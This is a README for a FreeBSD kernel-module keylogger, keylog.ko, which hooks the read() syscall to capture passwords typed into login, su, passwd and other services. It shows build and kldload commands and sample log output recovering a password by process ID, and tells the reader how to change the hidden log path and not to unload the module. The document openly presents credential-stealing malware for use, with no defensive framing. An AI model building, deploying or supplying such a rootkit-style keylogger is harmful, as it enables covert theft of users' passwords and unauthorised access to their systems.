keylog readme
=============

this module reads passwords entered via:
- login
- su
- passwd

and all other services using read() syscall.
tested on FreeBSD 9.3, should also run on 10.1 and others.

usage
=====
FreeBSD fbsd_default 9.3-RELEASE FreeBSD 9.3-RELEASE #0 r268512: Fri Jul 11 03:13:02 UTC 2014     root@snap.freebsd.org:/usr/obj/usr/src/sys/GENERIC  i386

# make
# kldload ./keylog.ko
# kldstat
Id Refs Address    Size     Name
 1    3 0xc0400000 1289f7c  kernel
 2    1 0xc49ad000 2000     keylog.ko


# ls -al /.keylog.txt
-rw-r--r--  1 root  wheel  809 Jun  2 22:59 /.keylog.txt

(10)
[1915]:p(112)
[1915]:a(97)
[1915]:s(115)
[1915]:s(115)
[1915]:w(119)
[1915]:o(111)
[1915]:r(114)
[1915]:d(100)
[1915]:
(10)

The logfile is organized as follows: [pid]:character. In this case you can see
that the entered password, called due the login binary with process id 1915 is: 'password'.

If you want to change the path, go into the sourcecode and look for the variable LOGPATH.

Warning. Unloading the module seams to leave the kernel in a unstable state, so do not unload it ;)

Author
------
dash
